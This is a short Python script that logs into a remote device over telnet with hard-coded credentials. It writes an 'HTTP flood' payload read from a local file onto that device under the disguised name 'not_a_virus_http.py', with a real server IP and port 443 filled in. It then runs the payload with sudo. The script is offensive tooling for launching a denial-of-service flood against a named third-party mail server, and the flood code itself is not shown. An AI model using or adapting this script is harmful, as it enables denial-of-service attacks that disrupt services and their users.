import telnetlib
import time
from locale import atoi

HOST = "192.168.100.8"
user = "pi"
password = "Ciumcium"

tn = telnetlib.Telnet(HOST)

tn.read_until(b"login: ")
tn.write(user.encode('ascii') + b"\n")
if password:
    tn.read_until(b"Password: ")
    tn.write(password.encode('ascii') + b"\n")
file = open('http_flood.txt', 'r')
strr = file.read()
#newstr = strr.replace("destination_host", 'imap.poczta.onet.pl')
newstr = strr.replace("destination_ip", '213.180.147.154')
str1 = newstr.replace('666', '443')

#print(str1)
# str1.replace('', '101')
file.close()

bfile = bytes(str1.encode())
tn.write(b"rm not_a_virus_http.py\n")
tn.write(b"touch not_a_virus_http.py\n")
print("1\n")
tn.write(b'echo ' + b'"' + bfile + b'"' + b'>>' + b'not_a_virus_http.py' + b'\n')
print('2')

tn.write(b"sudo python3 not_a_virus_http.py\n")
time.sleep(10)
tn.write(b"ls\n")

tn.write(b"exit \n")

print(tn.read_until(b"exit").decode('ascii'))